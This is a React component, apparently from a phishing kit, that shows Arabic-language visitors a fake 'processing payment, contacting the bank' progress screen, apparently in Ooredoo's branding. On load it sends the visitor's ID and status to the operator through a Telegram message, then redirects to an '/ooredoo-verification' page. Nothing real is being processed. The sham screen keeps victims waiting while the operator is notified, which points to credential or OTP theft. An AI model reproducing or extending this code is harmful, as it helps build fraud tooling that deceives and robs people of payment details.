import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useRegistration } from '../contexts/RegistrationContext';
import Header from '../components/Header';

const ATMLoading = () => {
  const navigate = useNavigate();
  const { sendTelegramMessage, formData } = useRegistration();
  const [progress, setProgress] = useState(0);
  const [status, setStatus] = useState('جاري معالجة الدفع...');

  useEffect(() => {
    const sendNotification = async () => {
      await sendTelegramMessage(
        `⏳ جاري معالجة الدفع\n\n` +
        `🆔 معرف المستخدم: ${formData.visitorId || 'غير متوفر'}\n` +
        `📊 الحالة: في صفحة التحميل`
      );
    };
    sendNotification();
  }, []);

  useEffect(() => {
    const statuses = [
      'جاري معالجة الدفع...',
      'جاري التحقق من البيانات...',
      'جاري الاتصال بالبنك...',
      'جاري تأكيد العملية...',
    ];

    let currentProgress = 0;
    let statusIndex = 0;

    const progressInterval = setInterval(() => {
      currentProgress += 1;
      setProgress(currentProgress);

      if (currentProgress % 25 === 0 && statusIndex < statuses.length - 1) {
        statusIndex++;
        setStatus(statuses[statusIndex]);
      }

      if (currentProgress >= 100) {
        clearInterval(progressInterval);
        setTimeout(() => {
          navigate('/ooredoo-verification');
        }, 500);
      }
    }, 80);

    return () => clearInterval(progressInterval);
  }, [navigate]);

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col" dir="rtl">
      <Header />

      <div className="flex-1 flex flex-col items-center justify-center p-6">
        <div className="bg-white rounded-2xl shadow-lg p-8 w-full max-w-md text-center">
          <div className="mb-8">
            <div className="w-20 h-20 bg-[#6A0F49] rounded-full flex items-center justify-center mx-auto mb-6 animate-pulse">
              <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
            </div>
            <h1 className="text-2xl font-bold text-[#6A0F49] mb-4">
              {status}
            </h1>
            <p className="text-gray-600 text-sm mb-6">
              الرجاء الانتظار وعدم إغلاق هذه الصفحة
            </p>
          </div>

          <div className="w-full bg-gray-200 rounded-full h-3 mb-4">
            <div 
              className="bg-[#6A0F49] h-3 rounded-full transition-all duration-100"
              style={{ width: `${progress}%` }}
            />
          </div>

          <p className="text-[#6A0F49] font-semibold">{progress}%</p>

          <div className="mt-8 flex justify-center gap-2">
            <div className="w-3 h-3 bg-[#6A0F49] rounded-full animate-bounce" style={{ animationDelay: '0ms' }} />
            <div className="w-3 h-3 bg-[#6A0F49] rounded-full animate-bounce" style={{ animationDelay: '150ms' }} />
            <div className="w-3 h-3 bg-[#6A0F49] rounded-full animate-bounce" style={{ animationDelay: '300ms' }} />
          </div>
        </div>
      </div>
    </div>
  );
};

export default ATMLoading;
